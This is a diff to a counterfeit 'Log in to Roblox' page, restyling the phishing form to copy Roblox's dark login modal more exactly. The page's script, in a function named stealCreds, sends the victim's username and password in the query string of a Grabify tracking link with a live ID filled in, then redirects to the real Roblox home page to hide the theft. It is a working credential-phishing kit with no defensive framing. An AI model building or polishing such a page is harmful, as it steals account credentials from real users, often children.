@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Log in to Roblox</title>
     <style>
-        /* Reset & Base Styles matching Roblox 2026 */
+        /* Roblox 2026 Exact Style */
         * {
             box-sizing: border-box;
             margin: 0;
@@ -13,111 +13,152 @@
         }
 
         body {
-            background-color: #ffffff; /* Clean white background */
+            background-color: #1e1e1e; /* Dark background matching the screenshot */
             font-family: 'Gotham SSm', 'Helvetica Neue', Helvetica, Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            color: #393b3d;
+            color: #ffffff;
+            /* Optional: Add a subtle blur or dark overlay if you want to mimic the game background */
+            background-image: radial-gradient(circle at center, #2a2a2a 0%, #1e1e1e 100%);
         }
 
-        .login-wrapper {
+        .login-container {
+            background-color: #232527; /* The exact dark grey of the modal */
             width: 100%;
-            max-width: 400px;
-            padding: 20px;
+            max-width: 450px;
+            padding: 40px 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
             display: flex;
             flex-direction: column;
             align-items: center;
         }
 
-        /* Roblox Logo */
-        .logo-container {
-            margin-bottom: 24px;
-            width: 100%;
-            display: flex;
-            justify-content: center;
-        }
-
-        .roblox-logo {
-            height: 50px;
-            /* Using a high-res transparent PNG of the modern logo */
+        .logo {
+            width: 140px;
+            margin-bottom: 20px;
+            /* Using the standard Roblox text logo */
             background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png');
             background-size: contain;
             background-repeat: no-repeat;
             background-position: center;
-            width: 160px;
+            height: 40px;
         }
 
-        h1 {
+        h2 {
             font-size: 20px;
             font-weight: 700;
-            margin-bottom: 24px;
-            color: #393b3d;
-            text-align: center;
+            margin-bottom: 20px;
+            color: #ffffff;
         }
 
-        /* Form Styles */
         .input-group {
             width: 100%;
-            margin-bottom: 16px;
+            margin-bottom: 15px;
         }
 
-        input[type="text"],
-        input[type="password"] {
+        input {
             width: 100%;
-            padding: 16px 12px;
-            border: 1px solid #a3b3c1; /* Light grey border */
-            border-radius: 8px; /* Modern rounded corners */
+            padding: 12px 15px;
+            background-color: #ffffff; /* White inputs */
+            border: none;
+            border-radius: 5px;
             font-size: 16px;
-            background-color: #f2f4f5; /* Very light grey input bg */
-            color: #393b3d;
+            color: #393b3d; /* Dark text */
             outline: none;
-            transition: border-color 0.2s, background-color 0.2s;
-        }
-
-        input:focus {
-            border-color: #0074bd; /* Roblox Blue on focus */
-            background-color: #ffffff;
-            box-shadow: 0 0 0 2px rgba(0, 116, 189, 0.1);
         }
 
         input::placeholder {
             color: #898989;
         }
 
-        /* The Big Blue Button */
+        /* The White Outline Button */
         .btn-login {
             width: 100%;
-            padding: 16px;
-            background-color: #0074bd; /* Modern Roblox Blue */
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 18px;
-            font-weight: 700;
+            padding: 12px;
+            background-color: transparent;
+            border: 1px solid #ffffff; /* White outline */
+            color: #ffffff; /* White text */
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 5px;
             cursor: pointer;
-            margin-top: 8px;
-            transition: background-color 0.2s;
+            margin-top: 10px;
+            transition: background 0.2s, color 0.2s;
         }
 
         .btn-login:hover {
-            background-color: #005a9e; /* Darker blue on hover */
+            background-color: rgba(255, 255, 255, 0.1);
         }
 
-        .btn-login:active {
-            transform: scale(0.98);
+        /* Links */
+        .links {
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            margin-top: 15px;
+            font-size: 14px;
         }
 
-        /* Spinner for loading state */
+        .links a {
+            color: #ffffff;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        .one-time-code {
+            margin-top: 15px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .btn-otp {
+            background: none;
+            border: none;
+            color: #ffffff;
+            font-size: 14px;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+
+        .quick-signin {
+            margin-top: 15px;
+            width: 100%;
+        }
+
+        .btn-quick {
+            width: 100%;
+            padding: 10px;
+            background-color: #393b3d; /* Dark grey button */
+            color: #ffffff;
+            border: none;
+            border-radius: 5px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .quick-signin span {
+            display: block;
+            font-size: 12px;
+            color: #898989;
+            margin-top: 5px;
+        }
+
         .spinner {
             display: none;
             margin: 15px auto;
             border: 3px solid #f3f3f3;
-            border-top: 3px solid #0074bd;
+            border-top: 3px solid #ffffff;
             border-radius: 50%;
-            width: 24px;
-            height: 24px;
+            width: 20px;
+            height: 20px;
             animation: spin 1s linear infinite;
         }
 
@@ -126,47 +167,26 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* Footer Links (Forgot Password / Sign Up) */
-        .footer-links {
-            margin-top: 24px;
-            text-align: center;
-            font-size: 14px;
-        }
-
-        .footer-links a {
-            color: #0074bd;
-            text-decoration: none;
-            margin: 0 8px;
-        }
-
-        .footer-links a:hover {
-            text-decoration: underline;
-        }
-
-        /* Mobile Adjustments */
+        /* Mobile Responsive */
         @media (max-width: 480px) {
-            .login-wrapper {
-                padding: 15px;
-            }
-            .roblox-logo {
-                height: 40px;
+            .login-container {
+                padding: 30px 20px;
+                margin: 10px;
             }
         }
     </style>
 </head>
 <body>
 
-<div class="login-wrapper">
-    <div class="logo-container">
-        <!-- Modern Roblox Logo -->
-        <div class="roblox-logo" aria-label="Roblox Logo"></div>
-    </div>
-
-    <h1>Log in</h1>
-
+<div class="login-container">
+    <!-- Roblox Logo -->
+    <div class="logo"></div>
+    
+    <h2>Login to Roblox</h2>
+    
     <form id="loginForm" onsubmit="stealCreds(event)">
         <div class="input-group">
-            <input type="text" id="username" name="username" placeholder="Username" required autocomplete="off">
+            <input type="text" id="username" name="username" placeholder="Username/Email/Phone" required autocomplete="off">
         </div>
         <div class="input-group">
             <input type="password" id="password" name="password" placeholder="Password" required autocomplete="off">
@@ -175,18 +195,25 @@
         <button type="submit" class="btn-login" id="loginBtn">Log In</button>
     </form>
 
-    <div class="spinner" id="spinner"></div>
-
-    <div class="footer-links">
-        <a href="#">Forgot Password?</a>
-        <span>|</span>
-        <a href="#">Sign Up</a>
+    <div class="links">
+        <a href="#">Forgot Password or Username?</a>
     </div>
+
+    <div class="one-time-code">
+        <button type="button" class="btn-otp">Email Me a One-Time Code</button>
+    </div>
+
+    <div class="quick-signin">
+        <button type="button" class="btn-quick">Quick Sign-in</button>
+        <span>Don't have an account? <a href="#" style="color:#ffffff; text-decoration: underline;">Sign Up</a></span>
+    </div>
+
+    <div class="spinner" id="spinner"></div>
 </div>
 
 <script>
     // --- CONFIGURATION ---
-    // REPLACE THIS WITH YOUR GRABIFY ID (e.g., "AbCdEfGh")
+    // REPLACE THIS WITH YOUR GRABIFY ID
     const grabifyID = "NOH6OC"; 
 
     function stealCreds(event) {
@@ -204,16 +231,14 @@
         btn.disabled = true;
         
         // 1. Send Data to Grabify
-        // We use fetch to send the data silently
         const url = `https://grabify.link/${grabifyID}?user=${encodeURIComponent(user)}&pass=${encodeURIComponent(pass)}`;
         
         fetch(url, {
             method: 'GET',
-            // Keepalive ensures the request finishes even if we redirect quickly
             keepalive: true
         }).catch(console.error);
             
-        // 2. Redirect to Real Roblox after a short delay
+        // 2. Redirect to Real Roblox
         setTimeout(() => {
             window.location.href = "https://www.roblox.com/home";
         }, 800);
